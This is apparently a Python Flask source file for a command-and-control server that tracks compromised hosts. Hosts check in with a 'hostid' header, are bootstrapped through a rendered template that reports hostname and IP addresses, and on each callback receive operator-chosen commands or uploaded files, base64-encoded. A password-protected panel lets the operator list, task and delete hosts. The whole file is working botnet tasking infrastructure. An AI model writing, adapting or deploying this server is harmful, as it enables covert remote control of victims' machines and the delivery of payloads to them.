from datetime import datetime
from flask import Flask, request, flash, url_for, redirect, \
     render_template, abort, Response, jsonify
from sqlalchemy.ext.hybrid import hybrid_property
from flask_sqlalchemy import SQLAlchemy
from base64 import b64encode as b64e, b64decode as b64d
from datetime import datetime
from functools import wraps


app = Flask(__name__)
app.config.from_pyfile('serv.cfg')
db = SQLAlchemy(app)

def check_auth(username, password):
    """This function is called to check if a username /
    password combination is valid.
    """
    return username == app.config["USERNAME"] and password == app.config["PASSWORD"]

def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
    'Could not verify your access level for that URL.\n'
    'You have to login with proper credentials', 401,
    {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

class HostBot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostid = db.Column(db.String, index=True)
    hostname = db.Column(db.String(100))
    resp = db.Column(db.String)
    last_cb = db.Column(db.DateTime)
    cb_host = db.Column(db.String)
    ip = db.Column(db.String(60))
    bootstrapped = db.Column(db.Boolean, default=False)

    @hybrid_property
    def resp_b64(self):
        return b64e(self.resp.encode('utf-8'))

    @hybrid_property
    def serialize(self):
        return [
                   str(self.id),
                   self.hostname,
                   self.ip,
                   self.cb_host,
                   self.last_cb.strftime('%m/%d/%Y %I:%M:%S %p'),
                   self.resp
               ]

@app.route('/<route>')
def cb(route):
    hostid = request.headers.get("hostid", None)
    if not hostid:
        return abort(403)
    b = HostBot.query.filter_by(hostid=hostid).one_or_none()
    if not b:
        b = HostBot(hostid=hostid, resp=render_template("bootstrap.html", url=request.url_root+url_for('bootstrap', hostid=hostid)[1:]))
    b.cb_host = request.host
    b.last_cb = datetime.now()
    db.session.add(b)
    db.session.commit()
    return b.resp_b64 if b.resp else b64e(b"exit")

@app.route('/bootstrap/<hostid>', methods=["POST"])
def bootstrap(hostid):
    b = HostBot.query.filter_by(hostid=hostid).one_or_none()
    if not b or b.bootstrapped:
        return abort(403)
    b.hostname = request.form.get("hn")
    # just cut out ipv6 for now...
    b.ip = ",".join([i for i in request.form.get("ip").split(",") if i.find(":")==-1])
    b.bootstrapped = True
    b.resp = ""
    db.session.add(b)
    db.session.commit()
    return '', 200

@app.route('/api/delete/<int:id>', methods=["GET"])
@requires_auth
def delete(id):
    try:
        b = HostBot.query.filter_by(id=id).one()
    except:
        abort(404)
    db.session.delete(b)
    db.session.commit()
    return '', 200

@app.route('/api/update/<int:id>', methods=["POST"])
@requires_auth
def update(id):
    try:
        b = HostBot.query.filter_by(id=id).one()
    except:
        abort(404)
    f = request.files.get('filereq', None)
    t = request.form.get("textentry", None)
    if request.form.get("clear", None):
        print("Clear set")
        b.resp = ""
    elif t:
        print("Text set")
        b.resp = t
    elif f:
        print("Read file")
        b.resp = f.read()
    db.session.add(b)
    db.session.commit()
    return '', 200


@app.route('/api/json')
@requires_auth
def json_api():
    return jsonify({"data": [i.serialize for i in HostBot.query.filter_by(bootstrapped=True)]})


@app.route('/')
@requires_auth
def index():
    b = HostBot.query.all()
    return render_template("index.htm", b=b)

if __name__ == '__main__':
    db.create_all()
    db.session.commit()
    args = {'host': '0.0.0.0',
            'port': 8000}
    if app.config["SSL"]:
        args['ssl_context'] = (app.config["SSL_CERT"], app.config["SSL_KEY"])
    app.run(**args)
